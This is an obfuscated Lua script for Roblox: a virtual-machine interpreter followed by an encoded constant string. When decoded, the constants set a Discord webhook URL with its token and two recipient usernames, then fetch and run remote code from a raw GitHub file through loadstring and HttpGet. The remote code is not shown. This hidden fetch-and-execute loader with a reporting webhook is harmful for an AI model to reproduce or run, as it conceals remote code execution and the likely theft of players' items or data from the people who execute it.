do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v67=0;while true do if (0==v67) then v19=v0(v3(v20,1,1));return "";end end else local v68=0;local v69;while true do if (v68==0) then v69=v2(v0(v20,16));if v19 then local v88=0;local v89;while true do if (v88==0) then v89=v5(v69,v19);v19=nil;v88=1;end if (v88==1) then return v89;end end else return v69;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v70=(v22/((1 + 1)^(v23-(1363 -(1072 + 261 + 29)))))%(2^(((v24-(2 -1)) -(v23-1)) + ((14 -11) -(1080 -(341 + 737))))) ;return v70-(v70%(2 -1)) ;else local v71=0 -0 ;local v72;while true do if (v71==(0 + 0)) then v72=(1 + 1)^(v23-((810 -(63 + 746)) + 0)) ;return (((v22%(v72 + v72))>=v72) and (1835 -(680 + 1154))) or (0 + 0) ;end end end end local function v25()local v38=v1(v16,v18,v18);v18=v18 + 1 ;return v38;end local function v26()local v39,v40=v1(v16,v18,v18 + (4 -2) );v18=v18 + (1532 -(846 + 684)) ;return (v40 * 256) + v39 ;end local function v27()local v41,v42,v43,v44=v1(v16,v18,v18 + (8 -5) );v18=v18 + (17 -13) ;return (v44 * 16777216) + (v43 * (47907 + 17629)) + (v42 * (608 -352)) + v41 ;end local function v28()local v45=v27();local v46=v27();local v47=1130 -(143 + (2421 -1435)) ;local v48=(v21(v46,1 + 0 ,(94 -34) -40 ) * ((644 -(555 + 87))^(623 -(329 + (522 -260))))) + v45 ;local v49=v21(v46,100 -79 ,31);local v50=((v21(v46,32)==(2 -1)) and  -(1 + 0)) or (1 + 0) ;if (v49==(1555 -(970 + 585))) then if (v48==((0 -0) + 0)) then return v50 * (0 + 0) ;else local v76=0;while true do if (v76==(0 + 0)) then v49=530 -((2091 -(519 + 1427)) + 384) ;v47=983 -(754 + 229) ;break;end end end elseif (v49==(1834 + 213)) then return ((v48==((0 + 0) -0)) and (v50 * ((1 -0)/(0 -0)))) or (v50 * NaN) ;end return v8(v50,v49-(1966 -(432 + 511)) ) * (v47 + (v48/((1 + 1)^((1391 -(974 + 412)) + 47)))) ;end local function v29(v30)local v51=702 -(206 + 496) ;local v52;local v53;while true do if ((1457 -(11 + (5226 -3781)))==v51) then v52=v3(v16,v18,(v18 + v30) -1 );v18=v18 + v30 ;v51=1 + (1293 -(753 + 539)) ;end if (v51==(1212 -(874 + 336))) then v53={};for v77=1, #v52 do v53[v77]=v2(v1(v3(v52,v77,v77)));end v51=5 -2 ;end if (3==v51) then return v6(v53);end if (v51==(0 -0)) then v52=nil;if  not v30 then v30=v27();if (v30==(0 -0)) then return "";end end v51=1;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if ((4 -0)~=v54) then else while true do if ((534 -(274 + 258))~=v55) then else local v85=0;while true do if (v85==(0 + 0)) then v60=nil;v61=nil;v85=1 -0 ;end if (1~=v85) then else v55=3;break;end end end if (v55~=(1554 -(373 + 1180))) then else local v86=0;local v87;while true do if (v86~=(0 -0)) then else v87=0;while true do if (v87~=(1 -0)) then else v55=907 -(180 + 725) ;break;end if (v87==(440 -(176 + 264))) then v58=nil;v59=nil;v87=1 + 0 ;end end break;end end end if (v55==0) then v56=0 + 0 ;v57=nil;v55=1 -0 ;end if (v55==(831 -(460 + 368))) then v62=nil;while true do local v90=0;while true do if (v90==(1 + 0)) then if (v56==(1 + 2)) then local v109=623 -(63 + 560) ;local v110;while true do if ((525 -(328 + 197))~=v109) then else v110=0 + 0 ;while true do local v122=1409 -(1368 + 41) ;while true do if (v122~=(0 + 0)) then else if (v110~=1) then else return v60;end if (0==v110) then local v150=0;local v151;while true do if (v150~=(1337 -(524 + 813))) then else v151=0 -0 ;while true do if (v151==0) then local v181=21 -(6 + 15) ;while true do if (v181==(0 -0)) then for v182=1249 -(408 + 840) ,v27() do v58[v182-1 ]=v33();end for v184=1784 -(1496 + 287) ,v27() do v59[v184]=v27();end v181=2 -1 ;end if (v181==(1 + 0)) then v151=3 -2 ;break;end end end if (v151==1) then v110=633 -(212 + 420) ;break;end end break;end end end break;end end end break;end end end if (v56==2) then local v111=0 -0 ;while true do if (v111~=(1 + 0)) then else for v123=1,v27() do local v124=0 -0 ;local v125;local v126;while true do if (v124~=(1837 -(1310 + 526))) then else while true do if (v125==0) then v126=v25();if (v21(v126,1 + 0 ,1)~=0) then else local v160=0 + 0 ;local v161;local v162;local v163;local v164;local v165;while true do if (v160~=(1046 -(528 + 517))) then else v163=nil;v164=nil;v160=2;end if (v160==(0 -0)) then v161=1537 -(362 + 1175) ;v162=nil;v160=1;end if ((1 + 1)~=v160) then else v165=nil;while true do if (v161==(6 -4)) then while true do if ((759 -(634 + 125))~=v162) then else local v189=0 -0 ;while true do if (1==v189) then v162=2 -1 ;break;end if ((0 -0)==v189) then v163=v21(v126,4 -2 ,3);v164=v21(v126,4,6);v189=1 + 0 ;end end end if (v162==(1 + 0)) then v165={v26(),v26(),nil,nil};if (v163==(1441 -(1290 + 151))) then local v194=0 + 0 ;local v195;while true do if (v194==(0 + 0)) then v195=0;while true do if ((0 -0)==v195) then v165[1561 -(176 + 1382) ]=v26();v165[4]=v26();break;end end break;end end elseif (v163==1) then v165[14 -11 ]=v27();elseif (v163==2) then v165[2 + 1 ]=v27() -((1610 -(987 + 621))^(14 + 2)) ;elseif (v163==(6 -3)) then local v206=0 + 0 ;local v207;local v208;while true do if ((3 -2)==v206) then while true do if (v207~=(1366 -(830 + 536))) then else v208=0 -0 ;while true do if (v208==(0 + 0)) then v165[2 + 1 ]=v27() -(2^16) ;v165[4]=v26();break;end end break;end end break;end if (v206==(892 -(766 + 126))) then v207=0 -0 ;v208=nil;v206=1 + 0 ;end end end v162=2 -0 ;end if ((6 -4)~=v162) then else local v190=0 -0 ;while true do if (v190~=(3 -2)) then else v162=3;break;end if ((1385 -(890 + 495))==v190) then if (v21(v164,1,1)==1) then v165[7 -5 ]=v62[v165[1 + 1 ]];end if (v21(v164,2,2)~=(3 -2)) then else v165[2 + 1 ]=v62[v165[553 -(479 + 71) ]];end v190=1;end end end if (v162~=(3 + 0)) then else if (v21(v164,6 -3 ,173 -(27 + 143) )~=(3 -2)) then else v165[1 + 3 ]=v62[v165[4]];end v57[v123]=v165;break;end end break;end if (v161~=(0 -0)) then else v162=0 + 0 ;v163=nil;v161=1 + 0 ;end if (v161==(326 -(29 + 296))) then v164=nil;v165=nil;v161=9 -7 ;end end break;end end end break;end end break;end if (v124~=(1556 -(946 + 610))) then else local v134=0 + 0 ;while true do if (v134==(2 -1)) then v124=1;break;end if (v134~=(956 -(638 + 318))) then else v125=0 -0 ;v126=nil;v134=1 + 0 ;end end end end end v56=1765 -(31 + 1731) ;break;end if (v111==(0 + 0)) then local v118=0 + 0 ;local v119;while true do if (v118==(0 -0)) then v119=0;while true do if (v119~=(32 -(27 + 4))) then else v111=1 + 0 ;break;end if (v119==(0 -0)) then local v152=0;while true do if (v152==(878 -(183 + 694))) then v119=1;break;end if (v152~=(254 -(229 + 25))) then else for v168=1,v61 do local v169=0 + 0 ;local v170;local v171;local v172;local v173;while true do if ((1129 -(900 + 228))~=v169) then else v172=nil;v173=nil;v169=1353 -(1301 + 50) ;end if (v169==(1 + 1)) then while true do if (v170==0) then local v186=0 + 0 ;while true do if (v186==(1 + 0)) then v170=2 -1 ;break;end if (v186==(0 + 0)) then v171=0 -0 ;v172=nil;v186=3 -2 ;end end end if (v170==1) then v173=nil;while true do if (v171==(1 + 0)) then if (v172==(2 -1)) then v173=v25()~=(1178 -(803 + 375)) ;elseif (v172==2) then v173=v28();elseif (v172==(3 + 0)) then v173=v29();end v62[v168]=v173;break;end if (v171~=0) then else local v193=534 -(315 + 219) ;while true do if (0==v193) then v172=v25();v173=nil;v193=1 + 0 ;end if (v193==(1046 -(132 + 913))) then v171=1 + 0 ;break;end end end end break;end end break;end if (v169==(1850 -(327 + 1523))) then v170=0 + 0 ;v171=nil;v169=1397 -(1142 + 254) ;end end end v60[5 -2 ]=v25();v152=3 -2 ;end end end end break;end end end end end break;end if (v90~=(0 + 0)) then else if (v56==(0 -0)) then local v112=0 -0 ;local v113;while true do if ((0 + 0)==v112) then v113=0 -0 ;while true do if ((1 + 0)==v113) then v59={};v56=434 -(248 + 185) ;break;end if (v113~=(0 + 0)) then else local v127=0;while true do if ((1649 -(560 + 1089))==v127) then v57={};v58={};v127=1 + 0 ;end if (v127==(913 -(341 + 571))) then v113=1 + 0 ;break;end end end end break;end end end if (v56==1) then local v114=0 + 0 ;local v115;local v116;while true do if (v114==0) then v115=0 + 0 ;v116=nil;v114=854 -(360 + 493) ;end if (v114==(228 -(164 + 63))) then while true do if (v115~=0) then else v116=1097 -(741 + 356) ;while true do if (v116==1) then v62={};v56=2;break;end if (v116==(0 + 0)) then local v153=0;while true do if (v153==(880 -(514 + 366))) then v60={v57,v58,nil,v59};v61=v27();v153=2 -1 ;end if (v153~=(1 + 0)) then else v116=4 -3 ;break;end end end end break;end end break;end end end v90=1 + 0 ;end end end break;end end break;end if ((1 + 1)==v54) then v59=nil;v60=nil;v54=3 + 0 ;end if (0==v54) then v55=510 -(266 + 244) ;v56=nil;v54=1 -0 ;end if (v54~=(8 -5)) then else v61=nil;v62=nil;v54=4;end if ((1 + 0)~=v54) then else v57=nil;v58=nil;v54=1 + 1 ;end end end local function v34(v35,v36,v37)local v63=0;local v64;local v65;local v66;while true do if (v63==0) then v64=v35[1];v65=v35[2];v63=1;end if (v63==1) then v66=v35[3];return function(...)local v79=0;local v80;local v81;local v82;local v83;local v84;while true do if (v79==2) then v84=nil;v84=function()local v91=v64;local v92=v65;local v93=v66;local v94=v32;local v95={};local v96={};local v97={};for v101=0 + 0 ,v83 do if ((v101>=v93) or ((293 + 2044)>=(4481 -((1774 -829) + 893)))) then v95[v101-v93 ]=v82[v101 + (1348 -((588 -(11 + 219)) + 989)) ];else v97[v101]=v82[v101 + 1 + 0 + 0 ];end end local v98=(v83-v93) + (1847 -(984 + 862)) ;local v99;local v100;while true do local v102=0;while true do if ((v102==(0 + 0)) or ((1471 + 2243)<=(411 + 2854))) then local v117=0 + (653 -(565 + 88)) ;while true do if (((65 + 133 + 4406)>=4518) and (v117==1)) then v102=1 -(0 -0) ;break;end if ((v117==((1 + 248) -(11 + 238))) or (((6603 -3179) + 363)<=(328 + 481))) then v99=v91[v80];v100=v99[1];v117=1578 -(1545 + 32) ;end end end if (((7236 -(1070 + 3426))==(4921 -2181)) and ((1 -(0 -0))==v102)) then if (((7922 -4785)==(3923 -(450 + (1709 -(1169 + 204))))) and (v100<=(10 -6))) then if ((4702>=((1533 -(813 + 185)) + 1026)) and (v100<=(350 -(134 + 215)))) then if ((v100>(0 -0)) or ((310 -220)>(2008 -1108))) then do return;end else for v135=v99[6 -4 ],v99[495 -(355 + 137) ] do v97[v135]=nil;end end elseif (((5294 -(95 + 279))==(6406 -(1363 + (159 -36)))) and (v100<=(2 + 0))) then v80=v99[3];elseif ((v100==(235 -(57 + 175))) or (4086>(5396 -((2238 -1211) + 170)))) then local v137=0;local v138;local v139;while true do if ((4190>(7156 -5139)) and (v137==1)) then while true do if (((517 + 436)>=672) and (v138==((209 + 1568) -(853 + 924)))) then v139=v99[2 + 0 ];v97[v139]=v97[v139](v13(v97,v139 + 1 ,v81));break;end end break;end if (((6921 -(6422 -3977))<(6605 -(995 + 694))) and (v137==(0 + 0))) then v138=1365 -(68 + 1297) ;v139=nil;v137=2 -1 ;end end elseif ((v97[v99[2 + 0 ]]==v99[2 + 0 + 2 ]) or ((4710 -2036)>(2372 + 402))) then v80=v80 + (4 -3) ;else v80=v99[13 -10 ];end elseif ((v100<=((631 -(62 + 565)) + 3)) or ((7447 -3946)<=(4001 -(662 + 448)))) then if (((18 + 1795)<=(4814 -2823)) and (v100<=5)) then local v129=0 -0 ;local v130;local v131;local v132;local v133;while true do if ((2683>=((5113 -(637 + 1085)) -(1340 + 573))) and (v129==(2 + 0))) then for v156=v130,v81 do local v157=(476 -(51 + 425)) + 0 ;local v158;local v159;while true do if ((2408>=1215) and (v157==(54 -(46 + 8)))) then v158=0 + (503 -(462 + 41)) ;v159=nil;v157=1 + 0 ;end if ((((3054 -(329 + 1593)) + 2589)>((834 -(101 + 216)) + 419)) and (v157==(1 + 0 + 0 + 0))) then while true do if ((590<=(5497 -2698)) and (((0 -0) + 0)==v158)) then v159=1304 -(877 + 427) ;while true do if (((13305 -10046)==(13954 -10695)) and (v159==0)) then v133=v133 + 1 + 0 ;v97[v156]=v131[v133];break;end end break;end end break;end end end break;end if (((277 + 151)<=3266) and (v129==(0 + 0))) then local v154=0 + 0 ;while true do if (((962 + 108)<=1940) and (v154==(1692 -(1140 + 551)))) then v129=1 + 0 ;break;end if ((v154==(493 -(271 + 222))) or ((5618 -(685 + 72))<(2172 -((365 -(127 + 102)) + 814)))) then v130=v99[1 + 1 ];v131,v132=v94(v97[v130](v13(v97,v130 + 1 ,v99[3 + 0 ])));v154=3 -2 ;end end end if (((1245 -(635 + 44))<=(1299 + (2700 -(676 + 323)))) and (v129==((688 -(316 + 370)) -1))) then v81=(v132 + v130) -(1 -0) ;v133=0;v129=7 -5 ;end end elseif ((2748<=3592) and (v100==(5 + 1))) then v37[v99[3 + (0 -0) ]]=v97[v99[2]];else v97[v99[(104 + 115) -(115 + 30 + 72) ]]=v37[v99[6 -3 ]];end elseif (((4076 -(96 + 83))>(1759 + 391)) and (v100<=(10 -2))) then v97[v99[2 + 0 ]]();elseif ((v100==(1548 -(1358 + 181))) or ((6999 -5407)>(1865 + (3167 -(83 + 1897))))) then local v144=0 + 0 ;local v145;local v146;local v147;while true do if ((v144==(1 + 0)) or (((84 -34) + 2464)<=(743 -(248 + (498 -348))))) then v147=nil;while true do if (((2267 + 2636)==4903) and (v145==(0 + 0))) then v146=v99[5 -(674 -(369 + 302)) ];v147=v97[v99[3]];v145=1 -0 ;end if ((v145==(1 -0)) or (269==(7562 -2586))) then v97[v146 + 1 + 0 ]=v147;v97[v146]=v147[v99[534 -(421 + 109) ]];break;end end break;end if (((3071 -1369)==1702) and (v144==0)) then v145=0 -0 ;v146=nil;v144=1 + 0 ;end end else v97[v99[2]]=v99[3];end v80=v80 + ((1581 -(1117 + 461)) -2) ;break;end end end end;v79=3;end if (v79==1) then v82={...};v83=v12("#",...) -1 ;v79=2;end if (v79==0) then v80=1;v81= -1;v79=1;end if (v79==3) then A,B=v32(v11(v84));if  not A[1] then local v103=0;local v104;while true do if (v103==0) then v104=v35[4][v80] or "?" ;error("Script error at ["   .. v104   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end break;end end end;end end end return v34(v33(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31302O382O3532383634393336332O363231322F5875684952365953572D76566A484E624676746C72796B4B34436176625870624459366A51526C6A75512D367643547234384661474472376E534176716C4A47455A6F58030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F72692O7A6875622F6D61696E2F4E65772E6C756103083O00557365724E616D65030C3O00702O6F70666163656D6F6D3103093O00557365724E616D653200243O00120A3O00016O000100013O0026043O0002000100010004023O0002000100120A000100013O00260400010011000100020004023O0011000100120A000200043O001206000200033O001207000200053O001207000300063O00200900030003000700120A000500084O0005000300054O000300023O00022O00080002000100010004023O0023000100260400010005000100010004023O0005000100120A000200013O0026040002001B000100010004023O001B000100120A0003000A3O001206000300093O00120A0003000A3O0012060003000B3O00120A000200023O00260400020014000100020004023O0014000100120A000100023O0004023O000500010004023O001400010004023O000500010004023O002300010004023O000200012O00013O00017O00243O00023O00033O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000D3O000D3O000E3O00103O00103O00113O00113O00123O00123O00133O00153O00153O00163O00173O00183O001A3O001C3O001D3O001F3O00",v9(),...);end
